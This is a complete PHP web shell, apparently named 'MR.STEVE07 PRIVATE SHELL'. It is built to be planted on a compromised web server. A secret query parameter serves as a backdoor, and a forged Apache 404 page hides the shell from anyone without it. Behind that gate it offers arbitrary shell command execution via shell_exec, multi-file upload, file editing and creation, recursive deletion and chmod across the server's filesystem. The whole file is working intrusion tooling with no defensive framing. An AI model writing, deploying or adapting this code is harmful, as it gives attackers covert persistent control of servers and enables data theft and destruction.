<?php
ob_start();
ini_set('display_errors',1);
error_reporting(E_ALL);
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

/* ================== BACKDOOR ACCESS ================== */
$secret_param = 'x';
$secret_value = '007';
if (!isset($_GET[$secret_param]) || $_GET[$secret_param] !== $secret_value) {
    http_response_code(404);
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p><hr><small>Apache/2.4.52 (Ubuntu) Server</small></body></html>';
    exit;
}
/* ==================================================== */

/* ---------------- PATH ---------------- */
$currentPath = isset($_GET['path']) ? $_GET['path'] : getcwd();
if (!file_exists($currentPath)) $currentPath = getcwd();
$currentPath = realpath($currentPath);
if ($currentPath === false || !is_dir($currentPath)) $currentPath = getcwd();

/* ---------------- COPY & PASTE SESSION ---------------- */
if (!isset($_SESSION['copied_items'])) $_SESSION['copied_items'] = [];

/* ---------------- RECURSIVE COPY FUNCTION ---------------- */
function copyAll($source, $dest) {
    if (is_file($source)) return copy($source, $dest);
    if (!is_dir($dest)) mkdir($dest, 0755, true);
    $items = scandir($source);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        copyAll($source . DIRECTORY_SEPARATOR . $item, $dest . DIRECTORY_SEPARATOR . $item);
    }
    return true;
}

/* ================== IMPROVED UPLOAD HANDLER ================== */
$upload_message = '';
if (isset($_FILES['upload_file'])) {
    $uploaded = 0;
    $failed = 0;
    
    if (is_array($_FILES['upload_file']['name'])) {
        // Multiple files
        for ($i = 0; $i < count($_FILES['upload_file']['name']); $i++) {
            if ($_FILES['upload_file']['error'][$i] === 0) {
                $name = basename($_FILES['upload_file']['name'][$i]);
                $target = $currentPath . DIRECTORY_SEPARATOR . $name;
                if (move_uploaded_file($_FILES['upload_file']['tmp_name'][$i], $target)) {
                    $uploaded++;
                } else {
                    $failed++;
                }
            } else {
                $failed++;
            }
        }
    } else {
        // Single file
        if ($_FILES['upload_file']['error'] === 0) {
            $name = basename($_FILES['upload_file']['name']);
            $target = $currentPath . DIRECTORY_SEPARATOR . $name;
            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
                $uploaded++;
            } else {
                $failed++;
            }
        } else {
            $failed++;
        }
    }
    
    if ($uploaded > 0) {
        $upload_message = "<span style='color:#00ff00;'>✓ $uploaded file(s) uploaded successfully!</span>";
    }
    if ($failed > 0) {
        $upload_message .= "<span style='color:#ff0000;'> ✗ $failed file(s) failed to upload.</span>";
    }
}
/* =========================================================== */

/* ---------------- MASS COPY ---------------- */
if (isset($_POST['mass_copy']) && !empty($_POST['selected'])) {
    $_SESSION['copied_items'] = $_POST['selected'];
    echo "<script>alert('Items Copied! Now go to destination folder and click Paste.');</script>";
}

/* ---------------- PASTE ---------------- */
if (isset($_POST['paste_items']) && !empty($_SESSION['copied_items'])) {
    $success = 0;
    foreach ($_SESSION['copied_items'] as $item) {
        $name = basename($item);
        $dest = $currentPath . DIRECTORY_SEPARATOR . $name;
        if (copyAll($item, $dest)) $success++;
    }
    echo "<script>alert('$success item(s) pasted successfully!');</script>";
}

/* ---------------- SIZE ---------------- */
function formatSize($bytes){
    if($bytes>=1073741824) return number_format($bytes/1073741824,2).' GB';
    if($bytes>=1048576) return number_format($bytes/1048576,2).' MB';
    if($bytes>=1024) return number_format($bytes/1024,2).' KB';
    return $bytes.' B';
}

/* ---------------- CMD EXECUTION ---------------- */
$cmd_output = '';
if(isset($_POST['run_cmd']) && !empty($_POST['command'])){
    $cmd = $_POST['command'];
    $cmd_output = shell_exec($cmd . ' 2>&1');
    if($cmd_output === null) $cmd_output = "Command execution failed or disabled.";
}

/* ---------------- CREATE NEW FOLDER / FILE ---------------- */
if(isset($_POST['create_folder']) && !empty($_POST['folder_name'])){
    $newFolder = $currentPath . DIRECTORY_SEPARATOR . basename($_POST['folder_name']);
    if(!file_exists($newFolder)){
        @mkdir($newFolder, 0755, true);
        echo "<script>alert('Folder Created Successfully!');</script>";
    } else {
        echo "<script>alert('Folder already exists!');</script>";
    }
}

if(isset($_POST['create_file']) && !empty($_POST['file_name'])){
    $newFile = $currentPath . DIRECTORY_SEPARATOR . basename($_POST['file_name']);
    if(!file_exists($newFile)){
        @file_put_contents($newFile, $_POST['file_content'] ?? '');
        echo "<script>alert('File Created Successfully!');</script>";
    } else {
        echo "<script>alert('File already exists!');</script>";
    }
}

/* ---------------- MASS DELETE / CHMOD ---------------- */
if(isset($_POST['mass_delete']) && !empty($_POST['selected'])){
    foreach($_POST['selected'] as $item){
        deleteAll($item);
    }
    echo "<script>alert('Selected items deleted!'); location.href='?path=".urlencode($currentPath)."&x=007';</script>";
    exit;
}

if(isset($_POST['mass_chmod']) && !empty($_POST['selected'])){
    $p = preg_replace('/[^0-7]/','',$_POST['new_perm']);
    if($p !== ''){
        $perm = octdec($p);
        foreach($_POST['selected'] as $item){
            @chmod($item, $perm);
        }
        echo "<script>alert('CHMOD applied successfully!'); location.href='?path=".urlencode($currentPath)."&x=007';</script>";
    }
    exit;
}

function deleteAll($path){
    if(is_file($path) || is_link($path)){
        @unlink($path);
        return;
    }
    if(!is_dir($path)) return;
    foreach(scandir($path) as $f){
        if($f=='.'||$f=='..') continue;
        deleteAll($path.DIRECTORY_SEPARATOR.$f);
    }
    @rmdir($path);
}

/* ================== INLINE EDITING ================== */
$edit_message = '';
$editing_file = null;
$edit_content = '';

if (isset($_GET['edit'])) {
    $editing_file = realpath($_GET['edit']);
    if ($editing_file && is_file($editing_file) && strpos($editing_file, $currentPath) === 0) {
        if (isset($_POST['save_inline'])) {
            $result = file_put_contents($editing_file, $_POST['content']);
            $edit_message = ($result !== false) ? 
                "<span style='color:#00ff00;'>✓ File saved successfully!</span>" : 
                "<span style='color:#ff0000;'>✗ Failed to save file!</span>";
        }
        $edit_content = file_get_contents($editing_file);
    } else {
        $edit_message = "<span style='color:#ff0000;'>Invalid file!</span>";
    }
}
/* ======================================================= */

$items = scandir($currentPath);
$folders = []; $files = [];
foreach($items as $i){
    if($i=='.' || $i=='..') continue;
    $p = $currentPath.DIRECTORY_SEPARATOR.$i;
    if(is_dir($p)) $folders[]=$i;
    else $files[]=$i;
}
$items = array_merge($folders, $files);

/* ---------------- BREADCRUMB ---------------- */
$parts = explode(DIRECTORY_SEPARATOR, trim($currentPath, DIRECTORY_SEPARATOR));
$buildPath = '';
?>
<!DOCTYPE html>
<html>
<head>
<title>FILE MANAGER v2.5</title>
<style>
body{background:#000;color:#00ff88;font-family:consolas;padding:20px;}
.header{text-align:center;font-size:34px;font-weight:bold;letter-spacing:4px;padding:20px;border:1px solid #00ff88;box-shadow:0 0 20px #00ff88;margin-bottom:20px;}
.subtop{display:flex;justify-content:space-between;margin-bottom:10px;}
table{width:100%;border-collapse:collapse;}
th,td{border:1px solid #00ff88;padding:8px;}
th{background:#001a00;}
a{color:#00ff88;text-decoration:none;}
a:hover{text-decoration:underline;color:#00ff00;}
.box{border:1px solid #00ff88;padding:10px;margin:10px 0;}
.name-link{cursor:pointer;font-weight:bold;}
.action-bar {margin:10px 0; padding:10px; border:1px solid #00ff88; background:#001a00;}
.cmd-box {background:#111; border:1px solid #00ff88; padding:10px; margin:10px 0;}
.cmd-output {background:#000; color:#00ff88; padding:10px; max-height:300px; overflow:auto; white-space:pre-wrap; font-family:consolas;}
.edit-box {background:#111;border:2px solid #00ff88;padding:15px;margin:15px 0;border-radius:5px;}
textarea{width:100%;height:60vh;background:#000;color:#00ff88;border:1px solid #00ff88;padding:12px;font-size:14px;font-family:consolas;resize:vertical;}
</style>
</head>
<body>

<div class="header"><font color="red">MR.STEVE07 PRIVATE SHELL v2.5</font></div>

<div class="subtop">
    <a href="?path=<?php echo urlencode(getcwd()); ?>&x=007">HOME</a>
</div>

<div class="box">
    <b>PATH:</b> <a href="?path=/&x=007">/</a>
    <?php foreach($parts as $p): if($p=='') continue; $buildPath .= '/'.$p; ?>
     / <a href="?path=<?php echo urlencode($buildPath); ?>&x=007"><?php echo htmlspecialchars($p); ?></a>
    <?php endforeach; ?>
</div>

<!-- CMD Section -->
<div class="action-bar">
    <form method="POST" style="margin-bottom:8px;">
        <b>CMD » </b>
        <input type="text" name="command" placeholder="Enter command here..." style="width:70%;">
        <button type="submit" name="run_cmd">Execute</button>
    </form>
    <?php if($cmd_output !== ''): ?>
    <div class="cmd-box">
        <b>Output:</b><br>
        <pre class="cmd-output"><?php echo htmlspecialchars($cmd_output); ?></pre>
    </div>
    <?php endif; ?>
</div>

<!-- Tools Bar + Improved Upload -->
<div class="action-bar">
    <form method="POST" style="display:inline;">
        <input type="text" name="folder_name" placeholder="New Folder Name" required>
        <button type="submit" name="create_folder">+ New Folder</button>
    </form>
    <form method="POST" style="display:inline;">
        <input type="text" name="file_name" placeholder="New File (e.g. test.php)" required>
        <button type="submit" name="create_file">+ New File</button>
    </form>

    <!-- Improved Upload -->
    <form method="POST" enctype="multipart/form-data" style="display:inline;">
        <input type="file" name="upload_file[]" multiple>
        <button type="submit">📤 UPLOAD (Multiple Allowed)</button>
    </form>

    <form method="POST" id="massForm" style="display:inline;">
        <button type="button" onclick="selectAll()">Select All</button>
        <button type="submit" name="mass_copy">📋 Copy Selected</button>
        <?php if(!empty($_SESSION['copied_items'])): ?>
            <button type="submit" name="paste_items" onclick="return confirm('Paste <?php echo count($_SESSION['copied_items']); ?> item(s) here?')">📌 Paste (<?php echo count($_SESSION['copied_items']); ?>)</button>
        <?php endif; ?>
        <button type="submit" name="mass_delete" onclick="return confirm('Delete all selected?')">🗑 Delete Selected</button>
        <input type="text" name="new_perm" placeholder="777" maxlength="4" style="width:60px;">
        <button type="submit" name="mass_chmod">🔧 Chmod Selected</button>
    </form>
</div>

<?php if ($upload_message): ?>
    <div class="box" style="color:#00ff88;">
        <?php echo $upload_message; ?>
    </div>
<?php endif; ?>

<?php if ($editing_file): ?>
    <div class="edit-box">
        <h3>Editing: <?php echo htmlspecialchars(basename($editing_file)); ?></h3>
        <?php echo $edit_message; ?>
        <form method="POST">
            <input type="hidden" name="save_inline" value="1">
            <textarea name="content"><?php echo htmlspecialchars($edit_content); ?></textarea><br><br>
            <button type="submit" style="padding:12px 25px;font-size:16px;">💾 SAVE FILE</button>
            <a href="?path=<?php echo urlencode($currentPath); ?>&x=007" style="padding:12px 25px;background:#333;color:#00ff88;text-decoration:none;margin-left:10px;">CANCEL</a>
        </form>
    </div>
<?php endif; ?>

<!-- File Table -->
<table>
<tr>
<th><input type="checkbox" id="selectAll" onclick="toggleAll(this)"></th>
<th>Name</th>
<th>Type</th>
<th>Permission</th>
<th>Size</th>
<th>Action</th>
</tr>
<?php foreach($items as $i):
$p = $currentPath.DIRECTORY_SEPARATOR.$i;
$perm = substr(sprintf('%o',@fileperms($p)),-4);
$isDir = is_dir($p);
?>
<tr>
<td><input type="checkbox" name="selected[]" value="<?php echo htmlspecialchars($p); ?>" form="massForm"></td>
<td>
    <?php if($isDir): ?>
        <a href="?path=<?php echo urlencode($p); ?>&x=007" class="name-link">📁 <?php echo htmlspecialchars($i); ?></a>
    <?php else: ?>
        📄 <?php echo htmlspecialchars($i); ?>
    <?php endif; ?>
</td>
<td><?php echo $isDir ? 'DIR' : 'FILE'; ?></td>
<td><?php echo $perm; ?></td>
<td><?php echo $isDir ? '-' : formatSize(filesize($p)); ?></td>
<td>
    <?php if(!$isDir): ?>
        <a href="?edit=<?php echo urlencode($p); ?>&path=<?php echo urlencode($currentPath); ?>&x=007">✏️ EDIT</a> |
    <?php else: ?>
        <a href="?path=<?php echo urlencode($p); ?>&x=007">OPEN</a> |
    <?php endif; ?>
    <a target="_blank" href="<?php echo htmlspecialchars($i); ?>?x=007">OPEN</a> |
    <a href="?chmod=<?php echo urlencode($p); ?>&path=<?php echo urlencode($currentPath); ?>&x=007">CHMOD</a> |
    <a onclick="return confirm('Delete?')" href="?delete=<?php echo urlencode($p); ?>&x=007">DEL</a>
</td>
</tr>
<?php endforeach; ?>
</table>

<script>
function toggleAll(source) {
    const checkboxes = document.querySelectorAll('input[name="selected[]"]');
    checkboxes.forEach(cb => cb.checked = source.checked);
}
function selectAll() {
    document.getElementById('selectAll').click();
}
</script>
</body>
</html>